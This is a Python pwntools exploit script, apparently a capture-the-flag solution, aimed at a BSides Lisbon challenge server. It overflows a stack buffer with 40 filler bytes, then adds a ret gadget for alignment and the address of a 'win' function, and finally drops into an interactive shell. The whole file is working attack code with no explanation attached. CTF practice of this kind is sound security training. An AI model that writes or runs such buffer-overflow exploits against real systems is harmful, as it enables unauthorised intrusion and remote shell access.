#!/usr/bin/env python3
from pwn import *

# Remote server details
host = "7f7eefe8-1ee6-49e4-b063-48b69c17922a-ayy.challs.bsideslisbon.org"
port = 20476


win_addr = 0x401186
offset = 40
# Gadget address for stack alignment (ret)
ret_gadget = 0x401016

print(f"[+] Connecting to {host}:{port}...")
p = remote(host, port)

print(f"[+] Connected!")
print(f"[+] Exploiting with offset {offset}...")
print(f"[+] Win address: {hex(win_addr)}\n")

p.recvuntil(b"You say: ")

payout = b'A' * offset + p64(ret_gadget) + p64(win_addr)
p.sendline(payout)

print(f"[+] Payload sent! Shell should be open...\n")

p.interactive()